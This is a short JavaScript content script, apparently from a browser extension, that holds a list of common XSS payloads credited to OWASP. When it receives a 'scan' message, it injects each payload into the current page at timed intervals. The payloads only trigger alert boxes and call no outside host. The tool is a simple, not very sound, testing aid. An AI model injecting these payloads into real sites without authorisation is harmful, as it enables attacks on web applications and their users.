// List of XSS payloads from OWASP Cheat Sheet
const xssPayloads = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg/onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "<body onload=alert('XSS')>",
  // Add more payloads from the OWASP Cheat Sheet
];

// Function to inject payloads and monitor for execution
function injectPayloads() {
  xssPayloads.forEach((payload, index) => {
    setTimeout(() => {
      try {
        console.log(`Testing Payload ${index + 1}: ${payload}`);

        // Send payload info to the popup
        chrome.runtime.sendMessage({ payload: payload });

        // Inject the payload into the page
        document.body.innerHTML += payload;

        // Check if the payload executed
        if (window.xssDetected) {
          console.log(`Payload ${index + 1} executed: ${payload}`);
          alert(`XSS Detected: ${payload}`);
        }
      } catch (error) {
        console.error(`Error injecting payload ${index + 1}:`, error);
      }
    }, index * 2000); // 2-second delay between payloads
  });
}

// Listen for messages from the background script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "scan") {
    injectPayloads();
    sendResponse({ status: "Scan started" });
  }
});
